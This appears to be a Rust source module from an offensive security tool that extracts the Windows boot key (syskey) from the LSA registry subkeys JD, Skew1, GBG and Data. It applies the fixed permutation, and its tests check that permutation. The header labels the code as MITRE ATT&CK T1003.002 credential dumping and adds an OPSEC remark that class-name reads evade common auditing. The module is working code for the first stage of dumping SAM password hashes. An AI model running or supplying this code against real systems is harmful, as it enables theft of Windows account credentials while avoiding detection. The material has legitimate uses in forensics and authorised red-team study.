//! Boot key (syskey) extraction from the SYSTEM registry hive
//!
//! The boot key is a 16-byte key derived from four registry subkeys under
//! HKLM\SYSTEM\CurrentControlSet\Control\Lsa. Each key stores part of the
//! key material in its **class name** field (not the default value).
//!
//! ## Algorithm
//! 1. Read class names of JD, Skew1, GBG, Data (4 bytes each → 16 hex chars each)
//! 2. Concatenate hex strings and decode to 16 raw bytes
//! 3. Apply a fixed permutation to produce the final boot key
//!
//! ## MITRE ATT&CK
//! - T1003.002: OS Credential Dumping: Security Account Manager
//!
//! ## OPSEC
//! - Registry class-name reads are less commonly audited than value reads
//! - Still requires SYSTEM or SeBackupPrivilege

/// Fixed permutation table for boot key derivation (well-known constant)
#[cfg(any(windows, test))]
const BOOT_KEY_PERM: [usize; 16] = [
    0x8, 0x5, 0x4, 0x2, 0xb, 0x9, 0xd, 0x3,
    0x0, 0x6, 0x1, 0xc, 0xe, 0xa, 0xf, 0x7,
];

/// Extract the 16-byte boot key from the SYSTEM registry hive.
///
/// Returns `Ok([u8; 16])` on success, or a descriptive error string.
#[cfg(windows)]
pub fn extract_boot_key() -> Result<[u8; 16], crate::KrakenError> {
    use windows_sys::Win32::System::Registry::{
        RegCloseKey, RegOpenKeyExW, RegQueryInfoKeyW, HKEY_LOCAL_MACHINE, KEY_READ,
    };

    // The four subkeys whose class names encode the boot key
    const SUBKEYS: [&str; 4] = [
        "SYSTEM\\CurrentControlSet\\Control\\Lsa\\JD",
        "SYSTEM\\CurrentControlSet\\Control\\Lsa\\Skew1",
        "SYSTEM\\CurrentControlSet\\Control\\Lsa\\GBG",
        "SYSTEM\\CurrentControlSet\\Control\\Lsa\\Data",
    ];

    let mut hex_combined = String::with_capacity(32);

    for subkey in &SUBKEYS {
        let class_hex = read_key_class(subkey)?;
        hex_combined.push_str(&class_hex);
    }

    // Decode the 32-char hex string → 16 raw bytes
    if hex_combined.len() != 32 {
        return Err(crate::KrakenError::Module(format!(
            "Unexpected boot key hex length: {} (expected 32)",
            hex_combined.len()
        )));
    }

    let mut raw = [0u8; 16];
    for i in 0..16 {
        let byte_str = &hex_combined[i * 2..i * 2 + 2];
        raw[i] = u8::from_str_radix(byte_str, 16).map_err(|e| {
            crate::KrakenError::Module(format!("Boot key hex decode error at byte {}: {}", i, e))
        })?;
    }

    // Apply permutation
    let mut boot_key = [0u8; 16];
    for (dst, &src) in BOOT_KEY_PERM.iter().enumerate() {
        boot_key[dst] = raw[src];
    }

    tracing::info!("Boot key extracted successfully");
    Ok(boot_key)
}

/// Read the class name of a registry key and return it as a hex string.
#[cfg(windows)]
fn read_key_class(subkey: &str) -> Result<String, crate::KrakenError> {
    use windows_sys::Win32::System::Registry::{
        RegCloseKey, RegOpenKeyExW, RegQueryInfoKeyW, HKEY_LOCAL_MACHINE, KEY_READ,
    };

    let wide: Vec<u16> = subkey
        .encode_utf16()
        .chain(std::iter::once(0))
        .collect();

    unsafe {
        let mut hkey = 0isize;
        let status = RegOpenKeyExW(
            HKEY_LOCAL_MACHINE,
            wide.as_ptr(),
            0,
            KEY_READ,
            &mut hkey,
        );
        if status != 0 {
            return Err(crate::KrakenError::Module(format!(
                "RegOpenKeyExW failed for '{}': error {}",
                subkey, status
            )));
        }

        // First call: determine class length
        let mut class_len: u32 = 0;
        RegQueryInfoKeyW(
            hkey,
            std::ptr::null_mut(),
            &mut class_len,
            std::ptr::null_mut(),
            std::ptr::null_mut(),
            std::ptr::null_mut(),
            std::ptr::null_mut(),
            std::ptr::null_mut(),
            std::ptr::null_mut(),
            std::ptr::null_mut(),
            std::ptr::null_mut(),
            std::ptr::null_mut(),
        );

        // class_len is in characters (UTF-16), not including the null terminator
        let buf_len = class_len as usize + 1;
        let mut class_buf: Vec<u16> = vec![0u16; buf_len];
        let mut class_len2 = class_len;

        let status2 = RegQueryInfoKeyW(
            hkey,
            class_buf.as_mut_ptr(),
            &mut class_len2,
            std::ptr::null_mut(),
            std::ptr::null_mut(),
            std::ptr::null_mut(),
            std::ptr::null_mut(),
            std::ptr::null_mut(),
            std::ptr::null_mut(),
            std::ptr::null_mut(),
            std::ptr::null_mut(),
            std::ptr::null_mut(),
        );

        RegCloseKey(hkey);

        if status2 != 0 {
            return Err(crate::KrakenError::Module(format!(
                "RegQueryInfoKeyW failed for '{}': error {}",
                subkey, status2
            )));
        }

        // Decode UTF-16 class name (strip null terminator if present)
        let class_str = String::from_utf16_lossy(&class_buf[..class_len2 as usize]);
        Ok(class_str.to_string())
    }
}

/// Stub for non-Windows platforms
#[cfg(not(windows))]
pub fn extract_boot_key() -> Result<[u8; 16], crate::KrakenError> {
    Err(crate::KrakenError::Module(
        "Boot key extraction only supported on Windows".into(),
    ))
}

#[cfg(test)]
mod tests {
    use super::*;

    /// Verify the permutation table produces the correct output for a known input.
    ///
    /// Test vector: raw bytes 0x00..0x0f, expected output determined by
    /// applying BOOT_KEY_PERM to the indices.
    #[test]
    fn test_boot_key_permutation() {
        let raw: [u8; 16] = [
            0x00, 0x01, 0x02, 0x03, 0x04, 0x05, 0x06, 0x07,
            0x08, 0x09, 0x0a, 0x0b, 0x0c, 0x0d, 0x0e, 0x0f,
        ];

        // Apply perm manually
        let mut expected = [0u8; 16];
        for (dst, &src) in BOOT_KEY_PERM.iter().enumerate() {
            expected[dst] = raw[src];
        }

        // expected[0] = raw[0x8] = 0x08
        // expected[1] = raw[0x5] = 0x05
        // expected[2] = raw[0x4] = 0x04
        // expected[3] = raw[0x2] = 0x02
        // ...
        assert_eq!(expected[0], 0x08);
        assert_eq!(expected[1], 0x05);
        assert_eq!(expected[2], 0x04);
        assert_eq!(expected[3], 0x02);
        assert_eq!(expected[4], 0x0b);
        assert_eq!(expected[5], 0x09);
        assert_eq!(expected[6], 0x0d);
        assert_eq!(expected[7], 0x03);
        assert_eq!(expected[8], 0x00);
        assert_eq!(expected[9], 0x06);
        assert_eq!(expected[10], 0x01);
        assert_eq!(expected[11], 0x0c);
        assert_eq!(expected[12], 0x0e);
        assert_eq!(expected[13], 0x0a);
        assert_eq!(expected[14], 0x0f);
        assert_eq!(expected[15], 0x07);
    }

    #[test]
    fn test_boot_key_perm_is_bijection() {
        // Each index must appear exactly once → permutation is valid
        let mut seen = [false; 16];
        for &src in &BOOT_KEY_PERM {
            assert!(!seen[src], "Duplicate index {} in BOOT_KEY_PERM", src);
            seen[src] = true;
        }
        assert!(seen.iter().all(|&v| v), "Not all indices covered");
    }

    #[test]
    #[cfg(not(windows))]
    fn test_extract_boot_key_unsupported() {
        let result = extract_boot_key();
        assert!(result.is_err());
        assert!(result
            .unwrap_err()
            .to_string()
            .contains("only supported on Windows"));
    }
}
